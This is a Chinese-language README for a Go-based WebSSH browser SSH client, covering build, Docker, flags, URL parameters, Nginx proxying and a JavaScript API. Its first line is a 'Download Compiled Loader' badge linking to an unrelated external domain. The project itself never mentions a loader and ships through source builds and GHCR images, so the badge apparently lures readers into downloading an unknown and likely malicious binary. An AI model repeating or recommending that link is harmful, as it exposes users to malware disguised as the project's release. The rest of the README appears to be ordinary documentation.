# WebSSH

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

基于 Go 语言重写的 WebSSH 客户端，通过浏览器安全连接 SSH 服务器。

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Go](https://img.shields.io/badge/go-1.24+-00ADD8.svg)
![Docker](https://img.shields.io/badge/docker-✓-2496ED.svg)

## 特性

- 🚀 **高性能** - Go 静态编译，无运行时依赖，11MB 二进制
- 🔐 **多种认证** - 密码、公钥（DSA/RSA/ECDSA/Ed25519）、TOTP 两因素认证
- 🖥️ **终端体验** - 全屏支持、窗口自适应、编码自动检测
- 📋 **复制粘贴** - 右键菜单、Ctrl+Shift+C/V 快捷键
- 🎨 **自定义字体** - 自动检测并加载等宽字体
- 🔒 **安全策略** - 主机密钥验证（reject/autoadd/warning）
- 🐳 **Docker 支持** - 多架构构建（amd64/arm64）

## 快速开始

### 直接运行

```bash
# 编译
cd go && go build -o webssh-go .

# 运行
./webssh-go --port=8888

# 浏览器访问
open http://127.0.0.1:8888
```

### Docker 运行

```bash
# 拉取镜像
docker pull ghcr.io/springsunx/webssh:latest

# 运行容器
docker run -d -p 8888:8888 --name webssh ghcr.io/springsunx/webssh:latest
```

### 从源码构建 Docker

```bash
# 构建镜像
docker build -f Dockerfile.go -t webssh .

# 运行容器
docker run -d -p 8888:8888 webssh
```

## 命令行参数

```bash
./webssh-go --help

# 基础配置
./webssh-go --address=0.0.0.0 --port=8888

# HTTPS 模式
./webssh-go --certfile=cert.crt --keyfile=key.key --port=80 --sslport=443

# 安全策略
./webssh-go --policy=reject    # 严格模式，只允许已知主机
./webssh-go --policy=autoadd   # 自动添加新主机密钥
./webssh-go --policy=warning   # 仅警告（默认）

# 调试模式
./webssh-go --debug

# 自定义字体
./webssh-go --font=JetBrainsMono-Regular.woff2

# 连接限制
./webssh-go --maxconn=20 --timeout=3
```

### 完整参数列表

| 参数 | 默认值 | 说明 |
|------|--------|------|
| `--address` | `""` | 监听地址 |
| `--port` | `8888` | HTTP 端口 |
| `--ssladdress` | `""` | HTTPS 监听地址 |
| `--sslport` | `4433` | HTTPS 端口 |
| `--certfile` | `""` | SSL 证书文件 |
| `--keyfile` | `""` | SSL 私钥文件 |
| `--policy` | `warning` | 主机密钥策略 |
| `--hostfile` | `""` | 用户主机密钥文件 |
| `--syshostfile` | `""` | 系统主机密钥文件 |
| `--tdstream` | `""` | 可信下游 IP（逗号分隔） |
| `--redirect` | `true` | HTTP 重定向到 HTTPS |
| `--fbidhttp` | `true` | 禁止公网 HTTP |
| `--xheaders` | `true` | 支持 X-Real-IP |
| `--wpintvl` | `0` | WebSocket 心跳间隔 |
| `--timeout` | `3` | SSH 连接超时（秒） |
| `--delay` | `3` | Worker 回收延迟（秒） |
| `--maxconn` | `20` | 每客户端最大连接数 |
| `--font` | `""` | 自定义字体文件名 |
| `--encoding` | `""` | 默认 SSH 编码 |
| `--origin` | `same` | 来源策略 |
| `--debug` | `false` | 调试模式 |

## 架构

```
+---------+     http     +-----------+    ssh    +-----------+
| browser | <==========> | Go 后端    | <=======> | ssh server|
+---------+   websocket  +-----------+    ssh    +-----------+
```

### 技术栈

| 组件 | 技术 |
|------|------|
| 后端 | Go 1.24 + gorilla/websocket + golang.org/x/crypto/ssh |
| 前端 | xterm.js + jQuery + 自定义 CSS |
| 构建 | GitHub Actions + Docker multi-stage |
| 镜像 | GitHub Container Registry (GHCR) |

## 快捷键

| 快捷键 | 功能 |
|--------|------|
| `Ctrl+Shift+C` | 复制选中文本 |
| `Ctrl+Shift+V` | 粘贴剪贴板内容 |
| `Ctrl+C` | 发送 SIGINT（中断信号） |
| `右键（有选中）` | 复制到剪贴板 |
| `右键（无选中）` | 粘贴剪贴板内容 |

## URL 参数

支持通过 URL 传递参数：

```bash
# 连接参数（密码需 base64 编码）
http://localhost:8888/?hostname=xx&username=yy&password=str_base64_encoded

# 终端背景色
http://localhost:8888/#bgcolor=green

# 字体颜色
http://localhost:8888/#fontcolor=red

# 自定义标题
http://localhost:8888/?title=my-ssh-server

# 编码
http://localhost:8888/#encoding=gbk

# 字体大小
http://localhost:8888/#fontsize=24

# 登录后执行命令
http://localhost:8888/?command=pwd

# 终端类型
http://localhost:8888/?term=xterm-256color
```

## 自定义字体

将字体文件（.woff2/.woff/.ttf/.otf）放入 `webssh/static/css/fonts/` 目录，重启服务即可自动加载。

推荐字体：
- [JetBrains Mono](https://www.jetbrains.com/lp/mono/)（已内置）
- [Fira Code](https://github.com/tonsky/FiraCode)
- [Source Code Pro](https://github.com/adobe-fonts/source-code-pro)

## Nginx 部署

```nginx
server {
    listen 443 ssl;
    server_name webssh.example.com;

    ssl_certificate /path/to/cert.crt;
    ssl_certificate_key /path/to/key.key;

    location / {
        proxy_pass http://127.0.0.1:8888;
        proxy_http_version 1.1;
        proxy_read_timeout 300;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $http_host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Real-PORT $remote_port;
    }
}
```

## 浏览器控制台

```javascript
// 连接到 SSH 服务器
wssh.connect(hostname, port, username, password, privatekey, passphrase, totp);

// 使用对象参数
wssh.connect({
  hostname: 'hostname',
  port: 'port',
  username: 'username',
  password: 'password',
  privatekey: 'the private key text',
  passphrase: 'passphrase',
  totp: 'totp'
});

// 使用表单数据连接
wssh.connect();

// 设置编码
wssh.set_encoding(encoding);

// 重置编码
wssh.reset_encoding();

// 发送命令
wssh.send('ls -l');
```

## 安全建议

1. **启用 HTTPS** - 始终在生产环境使用 SSL
2. **使用 reject 策略** - 配合已知主机密钥，防止中间人攻击
3. **限制连接数** - 使用 `--maxconn` 防止资源耗尽
4. **配置可信下游** - 使用 `--tdstream` 限制代理 IP

## License

MIT License - 详见 [LICENSE](LICENSE)
